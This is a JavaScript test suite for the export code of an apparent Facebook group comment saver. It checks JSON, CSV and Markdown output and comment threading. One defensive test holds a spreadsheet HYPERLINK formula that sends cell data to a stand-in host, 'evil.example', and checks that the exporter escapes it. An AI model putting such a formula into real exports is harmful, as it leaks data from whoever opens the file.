import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import { EXPORT_FORMAT } from '../../src/lib/constants.js';
import { CSV_COLUMNS, buildCsv, buildJson, buildMarkdown, buildThreads, exportFileName } from '../../src/lib/export.js';

const G = 'myanmarsoftwareengineers';
const BASE = `https://www.facebook.com/groups/${G}`;
const EXPORTED_AT = '2026-10-14T05:30:00.000Z';

function post(id, fields = {}) {
  return {
    id,
    groupSlug: G,
    url: `${BASE}/posts/${id}/`,
    authorName: null,
    authorId: null,
    authorUrl: null,
    text: '',
    postedAt: null,
    postedAtApprox: true,
    postedAtText: null,
    commentCountExpected: null,
    lastMode: 'post',
    firstSavedAt: '2026-10-13T00:00:00.000Z',
    lastSavedAt: '2026-10-13T00:00:00.000Z',
    lastFullScanAt: null,
    savedCommentCount: 0,
    ...fields,
  };
}

function comment(id, postId, fields = {}) {
  return {
    id,
    postId,
    groupSlug: G,
    threadId: id,
    parentId: null,
    depth: 0,
    isReply: false,
    replyToName: null,
    replyToKind: null,
    authorName: 'Someone',
    authorId: null,
    authorUrl: null,
    text: '',
    truncated: false,
    createdAt: null,
    createdAtApprox: true,
    createdAtText: null,
    relativeTime: null,
    reactionCount: 0,
    attachments: [],
    permalink: `${BASE}/posts/${postId}/?comment_id=${id}`,
    order: 0,
    firstSavedAt: '2026-10-13T00:00:00.000Z',
    lastSavedAt: '2026-10-13T00:00:00.000Z',
    missingAt: null,
    previousTexts: [],
    ...fields,
  };
}

const MM = 'မြန်မာ ဆော့ဖ်ဝဲ အင်ဂျင်နီယာများ'; // Myanmar Unicode text
const TRICKY = `${MM} 🍵😀 says "hi", then\nleaves; a CRLF line\r\nand a, comma`;

const POSTS = [
  post('100', { authorName: 'Older Post', postedAt: '2026-10-01T00:00:00.000Z', postedAtText: '1 October at 06:30', text: 'Old post' }),
  post('200', {
    authorName: 'BrightOtter3141',
    authorId: '100012345678901',
    postedAt: '2026-10-04T11:49:00.000Z',
    postedAtText: '4 October at 18:19',
    text: `Is a CS degree necessary?\n\n${MM}`,
  }),
  post('300', { authorName: 'Undated', postedAt: null }),
  post('400', { authorName: 'No comments', postedAt: '2026-09-01T00:00:00.000Z' }),
];

const COMMENTS = [
  // deliberately out of order; export must sort by `order`
  comment('2003', '200', { order: 2, depth: 2, isReply: true, threadId: '2001', parentId: '2002', replyToName: 'Snow2Rain2', replyToKind: 'reply', authorName: 'Thura Min Oo', text: 'Thanks!', createdAt: '2026-10-12T01:00:00.000Z', createdAtText: 'Monday 12 October 2026 at 07:30' }),
  comment('2001', '200', {
    order: 0,
    authorName: 'Thura Min Oo',
    authorId: '100004444444444',
    authorUrl: 'https://www.facebook.com/profile.php?id=100004444444444',
    text: 'Hardly any degree exists…\nIs there truly a degree…',
    createdAt: '2026-10-11T02:24:00.000Z',
    createdAtText: 'Sunday 11 October 2026 at 08:54',
    reactionCount: 5,
  }),
  comment('2002', '200', { order: 1, depth: 1, isReply: true, threadId: '2001', parentId: '2001', replyToName: 'Thura Min Oo', replyToKind: 'comment', authorName: 'Snow2Rain2', text: TRICKY }),
  comment('2004', '200', {
    order: 3,
    authorName: 'Chai_lover🍵',
    text: 'Look',
    attachments: [
      { type: 'image', src: 'https://scontent.fbcdn.net/a.jpg?oh=1&oe=2', alt: 'pic' },
      { type: 'link', href: 'https://example.com/x' },
    ],
    missingAt: '2026-10-14T00:00:00.000Z',
  }),
  comment('1001', '100', { order: 0, authorName: 'A *star* _under_', text: '' }),
  comment('3001', '300', { order: 0, text: 'undated post comment' }),
];

/** Minimal RFC 4180 parser for verification (handles quotes, "" escapes, CRLF/LF). */
function parseCsv(text) {
  const rows = [];
  let row = [];
  let field = '';
  let i = 0;
  let quoted = false;
  while (i < text.length) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        field += '"';
        i += 2;
        continue;
      }
      if (ch === '"') {
        quoted = false;
        i++;
        continue;
      }
      field += ch;
      i++;
      continue;
    }
    if (ch === '"') {
      assert.equal(field, '', 'quote must start a field');
      quoted = true;
      i++;
    } else if (ch === ',') {
      row.push(field);
      field = '';
      i++;
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i += 2;
    } else {
      assert.notEqual(ch, '\n', 'bare LF outside quotes');
      assert.notEqual(ch, '\r', 'bare CR outside quotes');
      field += ch;
      i++;
    }
  }
  assert.equal(quoted, false, 'unterminated quote');
  if (field !== '' || row.length) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

describe('buildJson', () => {
  const json = buildJson(POSTS, COMMENTS, { exportedAt: EXPORTED_AT });
  const data = JSON.parse(json);

  test('envelope', () => {
    assert.equal(data.format, EXPORT_FORMAT);
    assert.equal(data.exportedAt, EXPORTED_AT);
    assert.equal(data.postCount, 4);
    assert.equal(data.commentCount, 6);
    assert.ok(json.startsWith('{\n  "format"'), '2-space indentation');
  });

  test('posts sorted by postedAt desc, nulls last', () => {
    assert.deepEqual(data.posts.map((p) => p.id), ['200', '100', '400', '300']);
  });

  test('posts embed their comments sorted by order', () => {
    const p200 = data.posts[0];
    assert.equal(p200.authorName, 'BrightOtter3141');
    assert.equal(p200.text, POSTS[1].text);
    assert.deepEqual(p200.comments.map((c) => c.id), ['2001', '2002', '2003', '2004']);
    assert.equal(p200.comments[1].text, TRICKY);
    assert.deepEqual(data.posts[2].comments, []);
  });

  test('exportedAt accepts a Date and does not mutate input', () => {
    const before = JSON.stringify(POSTS);
    const d = JSON.parse(buildJson(POSTS, COMMENTS, { exportedAt: new Date(EXPORTED_AT) }));
    assert.equal(d.exportedAt, EXPORTED_AT);
    assert.equal(JSON.stringify(POSTS), before);
    assert.equal('comments' in POSTS[0], false);
  });
});

describe('buildCsv', () => {
  const csv = buildCsv(POSTS, COMMENTS);

  test('BOM, CRLF line endings, header', () => {
    assert.ok(csv.startsWith('﻿post_id,post_url,post_author,'));
    assert.ok(csv.endsWith('\r\n'));
    const header = csv.slice(1).split('\r\n')[0];
    assert.equal(
      header,
      'post_id,post_url,post_author,post_posted_at,post_text,comment_id,parent_id,thread_id,depth,is_reply,reply_to,author_name,author_id,author_url,text,created_at,created_at_text,reaction_count,attachment_urls,permalink,first_saved_at,last_saved_at,missing_at',
    );
    assert.equal(CSV_COLUMNS.length, 23);
  });

  test('round-trips through an RFC 4180 parser (Myanmar, emoji, quotes, commas, newlines)', () => {
    const rows = parseCsv(csv.slice(1));
    const [header, ...body] = rows;
    assert.deepEqual(header, CSV_COLUMNS);
    for (const r of body) assert.equal(r.length, CSV_COLUMNS.length);
    const records = body.map((r) => Object.fromEntries(header.map((h, i) => [h, r[i]])));

    // one row per comment, posts in JSON order, comments by order; post 400 has none
    assert.deepEqual(records.map((r) => r.comment_id), ['2001', '2002', '2003', '2004', '1001', '3001']);

    const reply = records[1];
    assert.equal(reply.text, TRICKY);
    assert.equal(reply.post_text, POSTS[1].text);
    assert.equal(reply.post_id, '200');
    assert.equal(reply.post_url, `${BASE}/posts/200/`);
    assert.equal(reply.post_author, 'BrightOtter3141');
    assert.equal(reply.post_posted_at, '2026-10-04T11:49:00.000Z');
    assert.equal(reply.parent_id, '2001');
    assert.equal(reply.thread_id, '2001');
    assert.equal(reply.depth, '1');
    assert.equal(reply.is_reply, 'true');
    assert.equal(reply.reply_to, 'Thura Min Oo');
    assert.equal(reply.author_name, 'Snow2Rain2');

    const top = records[0];
    assert.equal(top.is_reply, 'false');
    assert.equal(top.parent_id, '');
    assert.equal(top.author_id, '100004444444444');
    assert.equal(top.created_at, '2026-10-11T02:24:00.000Z');
    assert.equal(top.created_at_text, 'Sunday 11 October 2026 at 08:54');
    assert.equal(top.reaction_count, '5');
    assert.equal(top.permalink, `${BASE}/posts/200/?comment_id=2001`);
    assert.equal(top.missing_at, '');
    assert.equal(top.first_saved_at, '2026-10-13T00:00:00.000Z');

    const att = records[3];
    assert.equal(att.author_name, 'Chai_lover🍵');
    assert.equal(att.attachment_urls, 'https://scontent.fbcdn.net/a.jpg?oh=1&oe=2 https://example.com/x');
    assert.equal(att.missing_at, '2026-10-14T00:00:00.000Z');
  });

  test('quotes only fields that need it', () => {
    assert.ok(csv.includes(',Thanks!,'));
    assert.ok(csv.includes('"Hardly any degree exists…\nIs there truly a degree…"'));
    assert.ok(csv.includes('says ""hi"", then'));
  });

  test('free-text cells that a spreadsheet would run as a formula get a leading apostrophe', () => {
    const p = post('500', { authorName: '@SUM(1+1)', text: '=1+1 in the post', url: `${BASE}/posts/500/` });
    const comments = [
      comment('5001', '500', { order: 0, authorName: 'Normal', text: '=HYPERLINK("http://evil.example/?d="&A2,"Click")' }),
      comment('5002', '500', { order: 1, authorName: '+Plus', text: '+1', replyToName: '-dash' }),
      comment('5003', '500', { order: 2, text: '-ဟုတ်ပါတယ်', createdAtText: '\tTab' }),
      comment('5004', '500', { order: 3, text: '- point one\n- point two', authorUrl: '=evil' }),
      comment('5005', '500', { order: 4, text: 'fine = ok', depth: 0, reactionCount: 3 }),
    ];
    const rows = parseCsv(buildCsv([p], comments).slice(1));
    const rec = rows.slice(1).map((r) => Object.fromEntries(CSV_COLUMNS.map((h, i) => [h, r[i]])));
    assert.equal(rec[0].text, '\'=HYPERLINK("http://evil.example/?d="&A2,"Click")');
    assert.equal(rec[0].post_author, "'@SUM(1+1)");
    assert.equal(rec[0].post_text, "'=1+1 in the post");
    assert.equal(rec[1].author_name, "'+Plus");
    assert.equal(rec[1].text, "'+1");
    assert.equal(rec[1].reply_to, "'-dash");
    assert.equal(rec[2].text, "'-ဟုတ်ပါတယ်");
    assert.equal(rec[2].created_at_text, "'\tTab");
    assert.equal(rec[3].text, "'- point one\n- point two");
    assert.equal(rec[3].author_url, "'=evil");
    // Untouched: text not starting with a trigger, ids, numbers, ISO dates, URLs.
    assert.equal(rec[4].text, 'fine = ok');
    assert.equal(rec[4].comment_id, '5005');
    assert.equal(rec[4].depth, '0');
    assert.equal(rec[4].reaction_count, '3');
    assert.equal(rec[4].post_url, `${BASE}/posts/500/`);
    assert.equal(rec[4].first_saved_at, '2026-10-13T00:00:00.000Z');
  });

  test('comments whose post record is missing are still exported', () => {
    const rows = parseCsv(buildCsv([], [comment('9', '999', { text: 'orphan' })]).slice(1));
    assert.equal(rows.length, 2);
    assert.equal(rows[1][0], '999');
    assert.equal(rows[1][CSV_COLUMNS.indexOf('text')], 'orphan');
  });

  test('no comments → header only', () => {
    assert.equal(buildCsv(POSTS, []), `﻿${CSV_COLUMNS.join(',')}\r\n`);
  });
});

describe('buildMarkdown', () => {
  const md = buildMarkdown(POSTS, COMMENTS, { exportedAt: EXPORTED_AT });
  const lines = md.split('\n');

  test('title and post headers in postedAt-desc order', () => {
    assert.equal(lines[0], '# Saved comments');
    assert.ok(md.includes(EXPORTED_AT));
    const headers = lines.filter((l) => l.startsWith('## '));
    assert.deepEqual(headers, [
      '## BrightOtter3141 — 4 October at 18:19',
      '## Older Post — 1 October at 06:30',
      '## No comments — 2026-09-01T00:00:00.000Z',
      '## Undated',
    ]);
  });

  test('post URL and quoted post text', () => {
    const i = lines.indexOf('## BrightOtter3141 — 4 October at 18:19');
    assert.equal(lines[i + 2], `${BASE}/posts/200/`);
    assert.deepEqual(lines.slice(i + 4, i + 7), ['> Is a CS degree necessary?', '>', `> ${MM}`]);
  });

  test('threaded comments as nested lists with multi-line text indented', () => {
    const start = lines.indexOf('- **Thura Min Oo** · Sunday 11 October 2026 at 08:54 — Hardly any degree exists…');
    assert.notEqual(start, -1, md);
    assert.equal(lines[start + 1], '  Is there truly a degree…');
    assert.ok(lines[start + 2].startsWith(`  - **Snow2Rain2** — ${MM} 🍵😀 says "hi", then`));
    assert.equal(lines[start + 3], '    leaves; a CRLF line');
    assert.equal(lines[start + 4], '    and a, comma');
    assert.equal(lines[start + 5], '    - **Thura Min Oo** · Monday 12 October 2026 at 07:30 — Thanks!');
    assert.equal(lines[start + 6], '- **Chai\\_lover🍵** — Look');
    assert.equal(lines[start + 7], '  [image](https://scontent.fbcdn.net/a.jpg?oh=1&oe=2)');
    assert.equal(lines[start + 8], '  [link](https://example.com/x) (not found in last full scan)');
  });

  test('escapes markdown in author names; empty text; posts without comments', () => {
    assert.ok(lines.includes('- **A \\*star\\* \\_under\\_** —'), md);
    assert.ok(md.includes('_No comments saved._'));
    assert.ok(md.endsWith('\n'));
  });

  test('missing marker on single-line comment', () => {
    const out = buildMarkdown([post('1', { authorName: 'P' })], [comment('c', '1', { text: 'gone', missingAt: '2026-10-14T00:00:00.000Z' })], { exportedAt: EXPORTED_AT });
    assert.ok(out.includes('- **Someone** — gone (not found in last full scan)'), out);
  });

  test('threads follow parentId, not flat order: a reply sorted before its parent stays under it', () => {
    // A partial save gave reply G an order (1) before its parent D (3).
    const r = (id, parent, order, depth = 1) => comment(id, '1', { order, depth, isReply: true, threadId: parent, parentId: parent, authorName: id, text: id });
    const list = [
      comment('A', '1', { order: 0, authorName: 'A', text: 'A' }),
      r('G', 'D', 1),
      comment('C', '1', { order: 2, authorName: 'C', text: 'C' }),
      comment('D', '1', { order: 3, authorName: 'D', text: 'D' }),
      r('E', 'D', 4),
    ];
    const out = buildMarkdown([post('1', { authorName: 'P' })], list, { exportedAt: EXPORTED_AT });
    const bullets = out.split('\n').filter((l) => /^\s*- \*\*/.test(l));
    assert.deepEqual(bullets, ['- **A** — A', '- **C** — C', '- **D** — D', '  - **G** — G', '  - **E** — E']);
  });

  test('reply chains deeper than Facebook\'s two levels stay at level 2; orphans say whom they answer', () => {
    const chain = [comment('T', '1', { order: 0, authorName: 'T', text: 't' })];
    let parent = 'T';
    for (let i = 1; i <= 5; i++) {
      chain.push(comment(`r${i}`, '1', { order: i, depth: Math.min(i, 2), isReply: true, threadId: 'T', parentId: parent, authorName: `R${i}`, text: `r${i}` }));
      parent = `r${i}`;
    }
    chain.push(comment('o', '1', { order: 9, depth: 1, isReply: true, threadId: 'gone', parentId: 'gone', replyToName: 'Ghost', authorName: 'O', text: 'orphan' }));
    const out = buildMarkdown([post('1', { authorName: 'P' })], chain, { exportedAt: EXPORTED_AT });
    const bullets = out.split('\n').filter((l) => /^\s*- \*\*/.test(l));
    assert.deepEqual(bullets, [
      '- **T** — t',
      '  - **R1** — r1',
      '    - **R2** — r2',
      '    - **R3** — r3',
      '    - **R4** — r4',
      '    - **R5** — r5',
      '- **O** (reply to Ghost) — orphan',
    ]);
  });
});

describe('buildThreads', () => {
  const r = (id, parent, order, extra = {}) => comment(id, '1', { order, isReply: true, depth: 1, threadId: parent, parentId: parent, ...extra });
  const shape = (nodes) => nodes.map((n) => (n.children.length ? { [n.c.id]: shape(n.children) } : n.c.id));

  test('two passes: parents found regardless of order; children sorted by order then createdAt', () => {
    const roots = buildThreads([
      r('late', 'B', 0.5, { createdAt: '2026-10-02T00:00:00.000Z' }),
      comment('A', '1', { order: 0 }),
      comment('B', '1', { order: 1 }),
      r('early', 'B', 0.5, { createdAt: '2026-10-01T00:00:00.000Z' }),
      r('a1', 'A', 0.2),
    ]);
    assert.deepEqual(shape(roots), [{ A: ['a1'] }, { B: ['early', 'late'] }]);
  });

  test('falls back to the thread root; missing parents and cycles become roots', () => {
    const roots = buildThreads([
      comment('T', '1', { order: 0 }),
      r('x', 'nope', 1, { threadId: 'T' }), // parent missing → thread root
      r('orphan', 'gone', 2), // nothing found → root
      r('c1', 'c2', 3),
      r('c2', 'c1', 4), // c1 ↔ c2 cycle
      r('self', 'self', 5),
    ]);
    const ids = shape(roots);
    assert.deepEqual(ids[0], { T: ['x'] });
    assert.ok(ids.includes('orphan'));
    assert.ok(ids.includes('self'));
    // The cycle is broken: both comments are still rendered, exactly once.
    const flat = JSON.stringify(ids);
    assert.equal(flat.match(/"c1"/g).length, 1);
    assert.equal(flat.match(/"c2"/g).length, 1);
  });
});

describe('exportFileName', () => {
  const d = new Date(2026, 9, 4, 8, 5); // local time
  test('formats', () => {
    assert.equal(exportFileName('json', 'all', d), 'fb-comments-all-20261004-0805.json');
    assert.equal(exportFileName('csv', 'all', d), 'fb-comments-all-20261004-0805.csv');
    assert.equal(exportFileName('md', '1234567890123456', d), 'fb-comments-1234567890123456-20261004-0805.md');
    assert.equal(exportFileName('json', 'all', new Date(2026, 11, 31, 23, 59)), 'fb-comments-all-20261231-2359.json');
  });
  test('unsafe scope characters are replaced; date defaults to now', () => {
    assert.equal(exportFileName('json', 'a/b c', d), 'fb-comments-a-b-c-20261004-0805.json');
    assert.match(exportFileName('csv', 'all'), /^fb-comments-all-\d{8}-\d{4}\.csv$/);
  });
});
